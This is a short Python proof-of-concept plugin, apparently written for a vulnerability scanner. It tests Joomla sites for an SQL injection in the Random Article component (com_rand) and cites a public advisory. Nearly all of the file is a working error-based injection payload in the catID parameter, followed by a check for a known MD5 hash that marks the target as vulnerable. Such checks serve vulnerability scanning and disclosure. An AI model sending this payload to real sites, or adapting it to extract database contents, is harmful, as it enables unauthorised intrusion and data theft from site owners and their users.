#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : Joomla Random Article SQL Injection
From : http://cxsecurity.com/issue/WLB-2015030172
"""
def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload = ("index.php?option=com_rand&catID=1%27%20and(select%201%20FROM(select count(*),concat((select(select concat(MD5(3.14),0x27,0x7e)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--%20-&limit=1&style=1&view=articles&format=raw&Itemid=13")
    target_url=arg + payload
    code, head, res, _, _ = curl.curl("%s" % target_url)
    if code==200 and '4beed3b9c4a886067de0e3a094246f78' in res :
        security_hole(target_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.example.com/')[1])